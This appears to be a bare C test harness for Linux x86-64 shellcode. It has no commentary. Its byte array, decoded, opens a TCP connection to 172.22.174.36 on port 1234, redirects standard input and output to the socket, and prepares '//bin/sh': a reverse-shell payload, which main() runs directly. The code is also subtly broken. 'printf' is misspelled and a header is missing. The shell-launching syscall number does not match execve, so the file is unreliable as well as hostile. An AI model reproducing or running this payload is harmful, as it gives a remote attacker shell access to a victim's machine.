#include<stdlib.h>
#include<stdio.h>

unsigned char code[]= "\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x83\xc7\x02\x48\xff\xc6\x48\x31\xc0\xb0\x29\x0f\x05\x48\x31\xc9\xb9\xac\x16\xae\x24\x51\x48\x31\xdb\x66\xbb\x04\xd2\x53\x57\x48\x31\xd2\xb2\x10\x48\x89\xe6\x48\x89\xc7\x48\x31\xc0\x48\x83\xc0\x2a\x0f\x05\x48\x31\xf6\xb0\x21\x0f\x05\xb0\x21\x48\xff\xc6\x0f\x05\xb0\x21\x48\xff\xc6\x0f\x05\x48\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x50\x48\x89\xe7\x48\x31\xdb\x53\x57\x48\x31\xd2\x48\x31\xc0\x48\x83\xc0\x59\x0f\x05\x48\x31\xc0\xb0\x3c\xb2\x00\x0f\x05";

int main(){
	prinf("Shellcode Length = %d\n",(int)strlen(code));
	int (*ret)() = (int(*)())code;
	ret();

	
}
